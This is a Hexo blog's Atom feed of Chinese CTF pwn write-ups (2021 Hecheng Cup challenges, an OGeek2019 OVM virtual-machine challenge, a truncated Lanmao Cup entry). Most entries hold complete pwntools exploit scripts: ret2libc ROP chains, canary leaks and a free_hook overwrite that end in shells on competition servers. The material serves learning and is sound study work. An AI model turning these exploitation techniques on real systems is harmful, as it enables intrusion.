<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ShouCheng</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-13T08:01:25.322Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ShouCheng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021鹤城杯PWN</title>
    <link href="http://example.com/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/</id>
    <published>2021-10-08T12:29:14.000Z</published>
    <updated>2021-10-13T08:01:25.322Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次鹤城杯的题目友善，适合我这种pwn👶玩耍，但是就是这种幼儿园难度，却没能ak，还是太菜了，继续学习吧！迟早👶要变成👴！</p><h2 id="babyof"><a href="#babyof" class="headerlink" title="babyof"></a>babyof</h2><p>普通栈溢出，没什么好说的，非常基础的题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">21613</span>)<br><span class="hljs-comment">#p = process(&#x27;./littleof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./babyof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>main = <span class="hljs-number">0x40066b</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400743</span><br>ret = <span class="hljs-number">0x0000000000400506</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)<br>p.recvline()<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<br>p.send(payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="littleof"><a href="#littleof" class="headerlink" title="littleof"></a>littleof</h2><p>这题比上面多了个canary的泄露，其他没什么差别，同样是基础栈溢出题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">27056</span>)<br><span class="hljs-comment">#p = process(&#x27;./littleof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./littleof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>main = <span class="hljs-number">0x00000000004006E2</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400863</span><br>ret = <span class="hljs-number">0x000000000040059e</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> <br>p.sendlineafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>)<br>canary = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0xa</span><br>log.info(<span class="hljs-built_in">hex</span>(canary))<br>p.recvuntil(<span class="hljs-string">&quot;Try harder!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvline()<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Try harder!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="easycho"><a href="#easycho" class="headerlink" title="easycho"></a>easycho</h2><p>这题是stack smash，程序把flag读到了.bss上，又有地方可以写泄露pie地址，获得pie地址，也就获得了flag地址，之后通过栈溢出把argv[0]改为指向flag，在引发stack_chk_fail后打印出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">24842</span>)<br><span class="hljs-comment">#p = process(&#x27;./easyecho&#x27;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0xB1D)&quot;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Name: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>pie = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xcf0</span><br>flag_addr = <span class="hljs-number">0x0000000000202040</span> + pie<br>log.info(<span class="hljs-built_in">hex</span>(pie))<br>p.recvuntil(<span class="hljs-string">&quot;Input: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;backdoor&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x168</span> + p64(flag_addr))<br>p.sendlineafter(<span class="hljs-string">&quot;Input: &quot;</span>,<span class="hljs-string">&#x27;exitexit&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>攻防世界有原题<a href="https://blog.csdn.net/seaaseesa/article/details/103093182/%EF%BC%8C%E6%AF%9B%E9%83%BD%E6%B2%A1%E5%8F%98">https://blog.csdn.net/seaaseesa/article/details/103093182/，毛都没变</a></p><h2 id="onecho"><a href="#onecho" class="headerlink" title="onecho"></a>onecho</h2><p>这题比赛没出，好好写写wp</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次鹤城杯的题目友善，适合我这种pwn👶玩耍，但是就是这种幼儿园难度，却没能ak，还是太菜了，继续学习吧！迟早👶要变成👴！&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>VM pwn</title>
    <link href="http://example.com/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/</id>
    <published>2021-10-04T03:28:49.000Z</published>
    <updated>2021-10-13T08:01:25.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次做VM pwn，虽然全程是跟着诸多大佬博客走的，但总得还是个里程碑，在pwn的路上走的更远了一些。pwn👶也想变成pwn👴，不知道这天还有多远~</p><p>wp来源：</p><p><a href="https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501">https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501</a></p><p><a href="https://www.cnblogs.com/lemon629/p/13975686.html">https://www.cnblogs.com/lemon629/p/13975686.html</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/105862737">https://blog.csdn.net/seaaseesa/article/details/105862737</a></p><p><a href="https://zhuanlan.zhihu.com/p/257132453">https://zhuanlan.zhihu.com/p/257132453</a></p><h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>题目来自buuoj</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211004113441697.png" alt="image-20211004113441697"></p><p>常规checksec一下，64位，stack没开</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191907462.png" alt="image-20211005191907462"></p><p>主函数的代码审计</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191927756.png" alt="image-20211005191927756"></p><p>fetch函数的话，取出pc指向的指令，并自动加1，指向下一条</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005192113608.png" alt="image-20211005192113608"></p><p>execute函数的代码审计，下面是根据代码整合出来的指令表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">instr  --&gt;  op | num1 | num2 | num3  4B 32bit<br>op:<br>0x10 --&gt; reg[num1] = unsigned_byte(instr)<br>0x20 --&gt; reg[num1] = (byte(instr) == 0)<br>0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov mem, reg<br>0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov reg, mem<br>0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg<br>0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg<br>0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add<br>0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub<br>0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and<br>0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or<br>0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  <br>0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl<br>0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr<br>0XE0 and else --&gt; exit<br></code></pre></td></tr></table></figure><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005183901799-16334329637311.png" alt="image-20211005183901799"></p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191434825.png" alt="image-20211005191434825"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">知识补充：<br>movsx 有符号扩展，并传送。通过符号进行判断，如果符号位是0，则扩展的全都是0，如果是1，则扩展的全都是1。而该题中的movsxd是一样的，可能是因为是从ecx拓展为rdx<br>movzx 无符号扩展，并传送。所以一般适用在无符号的小数值拷贝到大数值里面<br>两个指令扩展的位数都和目的操作寄存器的位数一致<br></code></pre></td></tr></table></figure><p>结合汇编一起看，可以发现，数组下标没有禁止为负数的情况，所以是可以向上访问到got表，从而把函数地址放入寄存器中，获得函数地址。但是这边要注意，寄存器跟内存是4字节的，而泄露的地址是6字节的，、所以要用两个寄存器分别存放高四字节和低四字节</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195005486.png" alt="image-20211005195005486"></p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195011712.png" alt="image-20211005195011712"></p><p>然后就是退出execute时，会往之前申请的堆块里面写入内容，再释放掉。但是因为这个堆块的地址是存放在.bss上的，在上面的数组越界同样可以修改，所以可以改为free_hook - 0x8，改为这个是因为我们要释放得是一块含有/bin/sh的堆块，所以要先有位置填充/bin/sh，然后再写入system函数。</p><p>声明：我下面的图都是忘了-0x8的，后面懒得再截图了</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005210317826.png" alt="image-20211005210317826"></p><p>可以看见，一顿操作后，寄存器上确实存放了一个libc地址，计算与free_hook的偏移即可</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005211732444.png" alt="image-20211005211732444"></p><p>然后通过0x10一个字节一个字节的加，最终改成free_hook</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005212732683.png" alt="image-20211005212732683"></p><p>跟第一步一样，把free_hook地址写入comment</p><p>然后就是输入/bin/sh以及system函数，即可getshell！</p><p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005213743697.png" alt="image-20211005213743697"></p><p>成功！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b *main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_code</span>(<span class="hljs-params">op,num1,num2,num3</span>):</span><br>    code = (op&lt;&lt;<span class="hljs-number">24</span>) + (num1&lt;&lt;<span class="hljs-number">16</span>) + (num2&lt;&lt;<span class="hljs-number">8</span>) + num3<br>    p.sendline(<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">instr  --&gt;  op | num1 | num2 | num3  4B 32bit</span><br><span class="hljs-string">op:</span><br><span class="hljs-string">0x10 --&gt; reg[num1] = unsigned_byte(instr)</span><br><span class="hljs-string">0x20 --&gt; reg[num1] = (byte(instr) == 0)</span><br><span class="hljs-string">0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov reg, mem</span><br><span class="hljs-string">0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov mem, reg</span><br><span class="hljs-string">0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg</span><br><span class="hljs-string">0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg</span><br><span class="hljs-string">0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add</span><br><span class="hljs-string">0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub</span><br><span class="hljs-string">0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and</span><br><span class="hljs-string">0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or</span><br><span class="hljs-string">0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  </span><br><span class="hljs-string">0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl</span><br><span class="hljs-string">0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr</span><br><span class="hljs-string">0xE0 and else --&gt; exit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;PCPC: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;SP: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;CODE SIZE: &quot;</span>,<span class="hljs-string">&#x27;18&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;CODE: &quot;</span>)<br><span class="hljs-comment">#写入libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">25</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#修改libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>input_code(<span class="hljs-number">0xC0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xa0</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#修改comment</span><br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>) <br>input_code(<span class="hljs-number">0xE0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-comment">#6</span><br>p.recvuntil(<span class="hljs-string">&quot;R1: &quot;</span>)<br>addr1 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;R2: &quot;</span>)<br>addr2 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">4</span>),<span class="hljs-number">16</span>)<br>addr = (addr2&lt;&lt;<span class="hljs-number">32</span>) + addr1 - <span class="hljs-number">0x3c67a0</span><br>log.info(<span class="hljs-string">&quot;libc_base: 0x%x&quot;</span> %addr)<br>p.recvuntil(<span class="hljs-string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所谓VM pwn，就是模拟虚拟机的底层运行机制，大逻辑上拥有内存、寄存器，内存细分还有堆栈等等，以及自己的一套指令集，所以如果就算碰到不是上面的给了符号表的，也可以通过这个大逻辑自己进行理解性的还原代码，使得代码更好阅读。这类型的pwn题难点更多就是在于代码逻辑的理解，知道指令集的操作，再找寻里面出现的漏洞，要具备十足的耐心，毕竟现在2021的题目肯定比上面复杂很多很多。</p><p>然后呢在分析虚拟机实现了哪些指令时，可以从下面两个大方向入手：首先找到虚拟实现的内存以及寄存器，比如程序可能单独malloc几块内存用来当作寄存器或者栈空间，亦或者就用全局变量来实现；第二步就是读代码逻辑，分析指令。有字符串，可以直接根据提示的字符串识别；没有字符串，则根据指令<code>操作码</code>和<code>操作数</code>构成，操作数的个数还可分为一操作数指令、两操作数指令以及三操作数指令等概念加入到代码逻辑的阅读中，帮助我们快速分析和理解。</p><p>最后在调用寄存器进行布局getshell时，最好是要把代码中的指令进行整合，就像上面整合的一样，这样可以在写脚本，迅速知道操作码的取值以及操作对象的值</p><p>然后，加油！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;第一次做VM pwn，虽然全程是跟着诸多大佬博客走的，但总得还是个里程碑，在pwn的路上走的更远了一些。pwn👶也想变成pwn👴，不知道</summary>
      
    
    
    
    
    <category term="VMpwn" scheme="http://example.com/tags/VMpwn/"/>
    
  </entry>
  
  <entry>
    <title>2021蓝帽杯</title>
    <link href="http://example.com/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/"/>
    <id>http://example.com/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/</id>
    <published>2021-10-02T11:11:33.000Z</published>
    <updated>2021-10-13T08:01:25.149Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前还是个菜鸡，只把题目收集了，现在。。。还是菜鸡，但感觉鸡腿🍖可能大了点，来复现一下蓝帽杯的题目，持续更新吧，目前应该能更新到半决赛，为什么没有总决赛？因为没有wp也没有附件</p><p>wp：</p><p><a href="https://blog.csdn.net/qq_43678263/article/details/116277524">https://blog.csdn.net/qq_43678263/article/details/116277524</a></p><p><a href="https://www.lintstar.top/2020/12/784edd2e#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-3">https://www.lintstar.top/2020/12/784edd2e#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-3</a></p><h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002191216443.png" alt="image-20211002191216443"></p><p>常规checksec，64位保护全开</p><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002191600919.png" alt="image-20211002191600919"></p><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002192200578.png" alt="image-20211002192200578"></p><p>程序非常简单，就这么几行代码。开了沙箱，只能使用 open 和 read </p><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002193705578.png" 